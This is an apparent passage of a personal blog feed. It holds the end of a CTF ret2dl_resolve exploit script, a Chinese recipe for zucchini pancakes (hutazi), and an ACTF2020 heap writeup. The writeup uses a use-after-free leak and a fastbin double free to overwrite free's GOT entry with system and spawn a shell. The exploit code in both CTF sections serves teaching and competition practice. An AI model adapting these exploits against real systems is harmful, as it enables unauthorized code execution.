class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">': &#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(cmd=<span class="string">''</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> is_local: gdb.attach(p,cmd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ret2dl_resolve_x86</span><span class="params">(ELF_obj,func_name,resolve_addr,fake_stage,do_slim=<span class="number">1</span>)</span>:</span></span><br><span class="line">    jmprel = ELF_obj.dynamic_value_by_tag(<span class="string">"DT_JMPREL"</span>)<span class="comment">#rel_plt</span></span><br><span class="line">    relent = ELF_obj.dynamic_value_by_tag(<span class="string">"DT_RELENT"</span>)</span><br><span class="line">    symtab = ELF_obj.dynamic_value_by_tag(<span class="string">"DT_SYMTAB"</span>)<span class="comment">#dynsym</span></span><br><span class="line">    syment = ELF_obj.dynamic_value_by_tag(<span class="string">"DT_SYMENT"</span>)</span><br><span class="line">    strtab = ELF_obj.dynamic_value_by_tag(<span class="string">"DT_STRTAB"</span>)<span class="comment">#dynstr</span></span><br><span class="line">    versym = ELF_obj.dynamic_value_by_tag(<span class="string">"DT_VERSYM"</span>)<span class="comment">#version</span></span><br><span class="line">    plt0 = ELF_obj.get_section_by_name(<span class="string">'.plt'</span>).header.sh_addr</span><br><span class="line"></span><br><span class="line">    p_name = fake_stage+<span class="number">8</span>-strtab</span><br><span class="line">    len_bypass_version = <span class="number">8</span>-(len(func_name)+<span class="number">1</span>)%<span class="number">0x8</span></span><br><span class="line">    sym_addr_offset = fake_stage+<span class="number">8</span>+(len(func_name)+<span class="number">1</span>)+len_bypass_version-symtab</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> sym_addr_offset%<span class="number">0x10</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> sym_addr_offset%<span class="number">0x10</span> == <span class="number">8</span>:</span><br><span class="line">            len_bypass_version+=<span class="number">8</span></span><br><span class="line">            sym_addr_offset = fake_stage+<span class="number">8</span>+(len(func_name)+<span class="number">1</span>)+len_bypass_version-symtab</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            error(<span class="string">'something error!'</span>)</span><br><span class="line"></span><br><span class="line">    fake_sym = sym_addr_offset/<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        fake_ndx = u16(ELF_obj.read(versym+fake_sym*<span class="number">2</span>,<span class="number">2</span>))</span><br><span class="line">        <span class="keyword">if</span> fake_ndx != <span class="number">0</span>:</span><br><span class="line">            fake_sym+=<span class="number">1</span></span><br><span class="line">            len_bypass_version+=<span class="number">0x10</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> do_slim:</span><br><span class="line">        slim = len_bypass_version - len_bypass_version%<span class="number">8</span></span><br><span class="line">        version = len_bypass_version%<span class="number">8</span></span><br><span class="line">        resolve_data,resolve_call=ret2dl_resolve_x86(ELF_obj,func_name,resolve_addr,fake_stage+slim,<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> (resolve_data,resolve_call,fake_stage+slim)</span><br><span class="line"></span><br><span class="line">    fake_r_info = fake_sym&lt;&lt;<span class="number">8</span>|<span class="number">0x7</span></span><br><span class="line">    reloc_offset=fake_stage-jmprel</span><br><span class="line"></span><br><span class="line">    resolve_data = p32(resolve_addr)+p32(fake_r_info)+func_name+<span class="string">'\x00'</span></span><br><span class="line">    resolve_data += <span class="string">'a'</span>*len_bypass_version</span><br><span class="line">    resolve_data += p32(p_name)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">    resolve_call = p32(plt0)+p32(reloc_offset)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (resolve_data,resolve_call)</span><br><span class="line"></span><br><span class="line"><span class="comment"># info</span></span><br><span class="line"><span class="comment"># gadget</span></span><br><span class="line">pr  = <span class="number">0x08048379</span> <span class="comment"># pop ebx ; ret</span></span><br><span class="line">p3r = <span class="number">0x080485d9</span> <span class="comment"># pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># elf, libc</span></span><br><span class="line">stage = elf.bss()</span><br><span class="line"></span><br><span class="line"><span class="comment"># rop1</span></span><br><span class="line">dl_data,dl_call,stage = ret2dl_resolve_x86(elf,<span class="string">'system'</span>,stage+<span class="number">0x200</span>,stage)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">72</span></span><br><span class="line">payload = <span class="string">'A'</span>*offset</span><br><span class="line">payload += p32(elf.sym[<span class="string">'read'</span>]) + p32(p3r) + p32(<span class="number">0</span>) + p32(stage) + p32(len(dl_data)+<span class="number">8</span>)</span><br><span class="line">payload += dl_call + p32(pr) + p32(stage+len(dl_data))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'Are you the LEVEL5?\n'</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">raw_input(<span class="string">'go'</span>)</span><br><span class="line">sl(dl_data+<span class="string">'$0 1&gt;&amp;0\0'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> r2dl_reslove </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【美食分享】做着省事，吃着好吃——糊塌子</title>
      <link href="/2020/02/24/%E7%B3%8A%E5%A1%8C%E5%AD%90/"/>
      <url>/2020/02/24/%E7%B3%8A%E5%A1%8C%E5%AD%90/</url>
      
        <content type="html"><![CDATA[<p>众多早点中，我最喜欢糊塌子，只因他：</p><blockquote><p>做着省事，吃着好吃</p></blockquote><p>十分适合又懒又好吃的我，下面就分享一下糊塌子的做法~</p><h1 id="食材"><a href="#食材" class="headerlink" title="食材"></a>食材</h1><table><thead><tr><th>食材</th><th>数量</th></tr></thead><tbody><tr><td>面粉</td><td>少许</td></tr><tr><td>鸡蛋</td><td>2个</td></tr><tr><td>西葫芦</td><td>半根</td></tr><tr><td>香肠</td><td>适量</td></tr></tbody></table><h1 id="厨具"><a href="#厨具" class="headerlink" title="厨具"></a>厨具</h1><ul><li>擦丝器</li><li>盆儿(大)</li><li>平底锅/饼铛</li></ul><h1 id="做法"><a href="#做法" class="headerlink" title="做法"></a>做法</h1><h2 id="准备面糊"><a href="#准备面糊" class="headerlink" title="准备面糊"></a>准备面糊</h2><ol><li><p>西葫芦擦丝，香肠切成薄片</p><blockquote><p>没有西葫芦可以用黄瓜代替，不过个人感觉黄瓜没有西葫芦的好吃</p><p>香肠不加也可以，加的话不宜切的太厚</p></blockquote></li><li><p>面粉适量，倒入盆中，打俩鸡蛋，和进面粉</p></li><li><p>接半杯水，少少加之，均匀搅拌，形成面糊</p><blockquote><p>面糊不宜太稠或太稀，太稠的话不易摊开，太稀的话不易成形</p><p>可以用筷子挑一下，面糊缓缓流下即可</p></blockquote></li><li><p>倒入西葫芦丝、香肠，搅拌均匀</p><a href="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/htz_1.jpg" data-fancybox="group" data-caption="h1" class="fancybox"><img alt="h1" title="h1" data-src="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/htz_1.jpg" src="/img/loading.gif" class="lazyload"></a></li><li><p>加盐调味</p><blockquote><p>还可以加其他调料，依自己口味而定，比如我做就会加点儿白糖~</p></blockquote></li></ol><h2 id="摊糊塌子"><a href="#摊糊塌子" class="headerlink" title="摊糊塌子"></a>摊糊塌子</h2><ul><li><p>开火，倒少量油，油热后，转成小火</p><blockquote><p>火候要掌握好，大火容易糊</p></blockquote></li><li><p>倒一勺面糊，用勺子均匀摊开</p><blockquote><p>摊得越薄越好，太厚不易熟，口感亦不佳</p></blockquote></li><li><p>表面变硬后，用铲子翻面</p><blockquote><p>可以先用筷子挑起一点儿，看看颜色变没变，没变就是没熟</p></blockquote></li><li><p>两面都熟了就可以出锅啦</p><blockquote><p>焦了发黄就出锅，不要等糊了…</p></blockquote><a href="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/htz_3.jpg" data-fancybox="group" data-caption="h3" class="fancybox"><img alt="h3" title="h3" data-src="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/htz_3.jpg" src="/img/loading.gif" class="lazyload"></a></li></ul><h1 id="end"><a href="#end" class="headerlink" title="end"></a>end</h1><p>随做随分享，不定期更新：D</p>]]></content>
      
      
      <categories>
          
          <category> 菜谱 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 早点 </tag>
            
            <tag> 面食 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACT2020 SCP_Foundation writeup</title>
      <link href="/2020/02/23/ACTF2020-scp-foundation-writeup/"/>
      <url>/2020/02/23/ACTF2020-scp-foundation-writeup/</url>
      
        <content type="html"><![CDATA[<p>ACTF2020的两道堆体，当时还不会做，现在补上。</p><p>一共有两道，分别是SCP_Foundation_Secret和SCP_Foundation_Attack，Secret可以直接打印出flag，Attack则需要getshell，其余部分两题都一样，我只做了更难的getshell法。</p><h2 id="SCP-Foundation-Secret"><a href="#SCP-Foundation-Secret" class="headerlink" title="SCP_Foundation_Secret"></a>SCP_Foundation_Secret</h2><ul><li><p>题目描述：</p><blockquote><p>忘记了</p></blockquote></li><li><p>题目附件：</p></li><li><p>考察点：fastbin attack (<code>uaf</code> + <code>double free</code>)</p></li><li><p>难度：中等</p></li><li><p>分值：300</p></li></ul><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p><code>glibc heap</code>相关的菜单题，主函数如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">  <span class="keyword">long</span> in_FS_OFFSET;</span><br><span class="line">  undefined4 local_1c;</span><br><span class="line">  <span class="keyword">void</span> *local_18;</span><br><span class="line">  undefined8 local_10;</span><br><span class="line">  </span><br><span class="line">  local_10 = *(undefined8 *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">  local_1c = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(local_18,<span class="number">0</span>,<span class="number">10</span>);</span><br><span class="line">  init_system();</span><br><span class="line">  local_18 = (<span class="keyword">void</span> *)Login();</span><br><span class="line">  menu();</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt; Now please tell me what you want to do :"</span>);</span><br><span class="line">    __isoc99_scanf(&amp;DAT_00401dff,&amp;local_1c);</span><br><span class="line">    <span class="keyword">switch</span>(local_1c) &#123;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">      Log_out_SCP();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      View_status(local_18);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      Creat_SCP();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      Modify_SCP();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      Delete_SCP();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">      View_SCP();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">      Log_out_SCP();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">while</span>( <span class="literal">true</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>创建SCP的时候会连续malloc三次，主要代码如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Creat_SCP</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  pvVar1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  *(<span class="keyword">void</span> **)(SCP_Project_list + (<span class="keyword">long</span>)local_24 * <span class="number">8</span>) = pvVar1;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt; SCP name\'s length : "</span>);</span><br><span class="line">  __isoc99_scanf(&amp;DAT_00401dff,&amp;length);</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  p_name = <span class="built_in">malloc</span>((<span class="keyword">long</span>)(<span class="keyword">int</span>)length);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt; SCP name : "</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>,p_name,(ulong)length);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt; SCP description\'s length : "</span>);</span><br><span class="line">  __isoc99_scanf(&amp;DAT_00401dff,&amp;d_len);</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt; SCP description : "</span>);</span><br><span class="line">  p_desc = <span class="built_in">malloc</span>((<span class="keyword">long</span>)(<span class="keyword">int</span>)d_len);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>,p_desc,(ulong)d_len);</span><br><span class="line">  **(<span class="keyword">void</span> ***)(SCP_Project_list + (<span class="keyword">long</span>)local_24 * <span class="number">8</span>) = p_name;</span><br><span class="line">  *(<span class="keyword">void</span> **)(*(<span class="keyword">long</span> *)(SCP_Project_list + (<span class="keyword">long</span>)local_24 * <span class="number">8</span>) + <span class="number">8</span>) = p_desc;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>删除SCP的时候连续free三次，但是并未清空数据，主要部分如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Delete_SCP</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt; SCP project ID : "</span>);</span><br><span class="line">  __isoc99_scanf(&amp;DAT_00401dff,&amp;local_14);</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="built_in">free</span>(**(<span class="keyword">void</span> ***)(SCP_Project_list + (<span class="keyword">long</span>)local_14 * <span class="number">8</span>));</span><br><span class="line">  <span class="built_in">free</span>(*(<span class="keyword">void</span> **)(*(<span class="keyword">long</span> *)(SCP_Project_list + (<span class="keyword">long</span>)local_14 * <span class="number">8</span>) + <span class="number">8</span>));</span><br><span class="line">  <span class="built_in">free</span>(*(<span class="keyword">void</span> **)(SCP_Project_list + (<span class="keyword">long</span>)local_14 * <span class="number">8</span>));</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>从上面俩函数中，可以分析出SCP的结构体如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">SCP</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="keyword">char</span> *description;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>查看SCP会打印<code>name</code>和<code>description</code>中的数据，主要部分如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">View_SCP</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt; SCP project ID : "</span>);</span><br><span class="line">  __isoc99_scanf(&amp;DAT_00401dff,&amp;local_14);</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"# SCP\'s name is %s\n"</span>,**(undefined8 **)(SCP_Project_list + (<span class="keyword">long</span>)local_14 * <span class="number">8</span>));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"# SCP\'s description is %s\n"</span>,</span><br><span class="line">         *(undefined8 *)(*(<span class="keyword">long</span> *)(SCP_Project_list + (<span class="keyword">long</span>)local_14 * <span class="number">8</span>) + <span class="number">8</span>));</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>总体思路就是先利用<code>uaf</code>泄漏libc，然后<code>double free</code>，改<code>free</code>的<code>got</code>表为<code>system</code>函数，最后通过<code>free(&#39;/bin/sh&#39;)</code>拿到shell</p><p>创建SCP时，三次malloc依次为</p><ol><li>SCP结构体，大小<code>0x20</code></li><li><code>name</code>，大小自定</li><li><code>description</code>，大小自定</li></ol><h3 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h3><p>利用fastbin LIFO的特性，先创建两个SCP，再删除它们，获得两个<code>0x20</code>的fastbin</p><blockquote><p>这两个SCP的<code>name</code>和<code>description</code>的大小需要都不在<code>0x20</code>范围内</p></blockquote><p>然后再创建一个SCP，<code>name</code>的大小等于<code>0x18</code>，这时<code>name</code>的<code>chunk</code>就会被分派到已经释放了的0号节点的位置，向<code>name</code>中写入任意地址，只要查看0号节点，就可以打印出该地址中的数据</p><p>我的做法是向<code>name</code>中写<code>free</code>的<code>got</code>表，然后打印出<code>libc</code>中<code>free</code>的地址：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x28</span>,<span class="string">'AAAAAAAA'</span>,<span class="number">0x58</span>,<span class="string">'aaaaaaaa'</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">'BBBBBBBB'</span>,<span class="number">0x58</span>,<span class="string">'bbbbbbbb'</span>) <span class="comment">#1</span></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">dlt(<span class="number">0</span>)</span><br><span class="line">dlt(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x18</span>,p64(elf.got[<span class="string">'free'</span>]),<span class="number">0x18</span>,<span class="string">'dddddddd'</span>) <span class="comment">#3</span></span><br><span class="line">free = uu64(show(<span class="number">0</span>))</span><br></pre></td></tr></table></figure></div><h3 id="Double-Free"><a href="#Double-Free" class="headerlink" title="Double Free"></a>Double Free</h3><p>题目有限制，只能添加10个SCP，因此要节约使用，刚刚泄漏libc时创建的两个节点可以重复使用，uaf只是在<code>0x20</code>的<code>fastbin</code>上做手脚，其余的<code>fastbin</code>不受影响。</p><p>虽然创建一次会连续<code>malloc</code>三次，但是只要这三次<code>malloc</code>出的<code>chunk</code>大小不一样，就不会互相影响。</p><p>这里有一点需要注意，要想成功<code>malloc</code>到<code>free</code>的<code>GOT</code>表，必须要先伪造<code>chunk</code>的<code>size</code>，通过调试，顺着<code>GOT</code>表中<code>free</code>的地址往前找，在第<code>14</code>字节找到了<code>0x60</code>，因此往这里可以分配<code>0x50-0x60</code>的chunk</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; got</span><br><span class="line">[<span class="number">0x603018</span>] <span class="built_in">free</span>@GLIBC_2<span class="number">.2</span><span class="number">.5</span> -&gt; <span class="number">0x7ff53a3dd4f0</span> (<span class="built_in">free</span>) ◂— push   r13</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/<span class="number">8</span>xg <span class="number">0x603018</span><span class="number">-0x10</span><span class="number">-14</span></span><br><span class="line"><span class="number">0x602ffa</span>:<span class="number">0x2e28000000000000</span><span class="number">0xa168000000000060</span> ◂— <span class="built_in">size</span></span><br><span class="line"><span class="number">0x60300a</span>:<span class="number">0xae1000007ff53a94</span><span class="number">0xd4f000007ff53a73</span></span><br><span class="line"><span class="number">0x60301a</span>:<span class="number">0x869000007ff53a3d</span><span class="number">0x078600007ff53a3c</span></span><br><span class="line"><span class="number">0x60302a</span>:<span class="number">0xf6b0000000000040</span><span class="number">0xe80000007ff53a3c</span></span><br></pre></td></tr></table></figure></div><p>具体的操作如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x28</span>,<span class="string">'AAAAAAAA'</span>,<span class="number">0x58</span>,<span class="string">'aaaaaaaa'</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">'BBBBBBBB'</span>,<span class="number">0x58</span>,<span class="string">'bbbbbbbb'</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">'CCCCCCCC'</span>,<span class="number">0x58</span>,<span class="string">'cccccccc'</span>) <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">dlt(<span class="number">0</span>)</span><br><span class="line">dlt(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x18</span>,p64(elf.got[<span class="string">'free'</span>]),<span class="number">0x18</span>,<span class="string">'dddddddd'</span>) <span class="comment">#3</span></span><br><span class="line">free = uu64(show(<span class="number">0</span>))</span><br><span class="line">dlt(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># double free</span></span><br><span class="line">dlt(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x28</span>,p64(<span class="number">0xdeadbeef</span>),<span class="number">0x58</span>,p64(elf.got[<span class="string">'free'</span>]<span class="number">-16</span><span class="number">-14</span>)) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x28</span>,p64(<span class="number">0xdeadbeef</span>),<span class="number">0x58</span>,<span class="string">'eeeeeeee'</span>) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x28</span>,p64(<span class="number">0xdeadbeef</span>),<span class="number">0x58</span>,<span class="string">'ffffffff'</span>) <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite free got</span></span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">'/bin/sh\0'</span>,<span class="number">0x58</span>,<span class="string">'a'</span>*<span class="number">14</span>+p64(system)) <span class="comment">#7</span></span><br></pre></td></tr></table></figure></div><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># system('/bin/sh')</span></span><br><span class="line">dlt(<span class="number">7</span>)</span><br></pre></td></tr></table></figure></div><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span 